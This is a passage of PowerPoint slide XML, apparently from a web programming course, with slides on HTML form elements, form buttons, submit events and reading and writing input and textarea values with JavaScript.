                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&lt;option</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>value</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plumber</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"</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a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&lt;option</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>value</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>bureaucrat</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"</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a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&lt;/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>datalist</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI" sz="2800" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49"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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{AFED01D0-1991-4749-ACEE-BE4770F78AAD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>Form buttons</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{99233F61-61D8-4E3F-BCB6-603EA10A2D00}"/>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b="1" dirty="0"/>
              <a:t>&lt;input type="reset"&gt; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>reset buttons (clears form), triggers </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>onreset</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> event if such is defined</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>&lt;input type="button"&gt; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>JavaScript button, doesn't do submit event</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>&lt;input type="submit"&gt; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Submit button, clicking it will cause submit event. The browser tries to send the form data to the URL specified in form's action attribute using either GET (default) or POST method</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>value = label of button</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>&lt;button&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> is same as submit, but allows HTML inside button</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>onclick</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> event handler for all of them</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>onsubmit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> event handler for submit button, attached to form element.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>event.preventDefault</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>();</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> will cancel form data submission to server.</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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{64D83F8A-1A00-4316-9C24-259502FF85AF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>Reading and Writing form data</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{26E2646E-3824-446A-A99B-DAC8A3F983A3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr rtlCol="0">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Access form elements either via:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="514350" indent="-514350" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>document</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0" err="1"/>
              <a:t>formname</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0" err="1"/>
              <a:t>fieldname</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" i="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="514350" indent="-514350" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>document.getElementById</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>("</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0" err="1"/>
              <a:t>idname</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="514350" indent="-514350" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Many form input fields have a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>value</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> attribute, which can be both read &amp; written</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="514350" indent="-514350" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>You can define form &lt;input&gt; field or &lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>textarea</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>&gt; with </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>readonly</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> attribute to make it read only, so that you can alter its contents only with JavaScript. Disabled will make it disabled.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="514350" indent="-514350" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pP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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F10C6919-B1EF-4E38-AE8A-3B8BAD910939}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="3600" dirty="0"/>
              <a:t>&lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="3600" dirty="0" err="1"/>
              <a:t>textarea</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="3600" dirty="0"/>
              <a:t>&gt; and</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="fi-FI" sz="3600" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="3600" dirty="0"/>
              <a:t>&lt;input type="</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="3600" dirty="0" err="1"/>
              <a:t>text|password|hidden|file|number|etc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="3600" dirty="0"/>
              <a:t>."&gt;</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="fi-FI" sz="3600" dirty="0"/>
            </a:br>
            <a:endParaRPr lang="en-US" altLang="fi-FI" sz="3600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="78851" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9A83FBE7-A493-4724-9782-8DD8900F32EE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>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form</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myform</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a: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&lt;input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type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text</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size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"60"</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name</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fieldname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FF0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>id</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fieldname</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form</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script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var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val</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>document</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myform</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fieldname</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read</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the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field</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document</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myform</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fieldname</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new</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value</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write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the</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field</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:b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var</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val</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>document</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getElementById</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fieldname</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read</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document</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getElementById</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fieldname</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value</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = </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new</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>value</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write</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script</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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9B029BA9-0D96-4FD5-BB14-C5ACAAE0538B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0"/>
              <a:t>Reading and writing input and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0" err="1"/>
              <a:t>textarea</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0"/>
              <a:t> data</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="79875" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{91958709-A306-4B64-8D64-A101C3146911}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="1600200"/>
            <a:ext cx="10972800" cy="4983162"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>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old</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style</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a:solidFill>
                  <a:srgbClr val="795E26"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>show</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form</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myform</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inputtext</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console</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="795E26"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>log</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myform</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textarea</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new</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style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using</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document.getElementById</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a: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a:solidFill>
                  <a:srgbClr val="795E26"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>show2</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event</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inputtext</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id_inputtext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textarea</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id_textarea</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result</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a: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innerText</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> =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inputtext</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>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inputtext</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>}</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EE0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>\</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="EE0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>n</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>textarea</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> =</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EE0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>\n</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>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textarea</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>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writing</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> to input </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>fields</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>textarea</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modify</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event</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id_inputtext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 = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
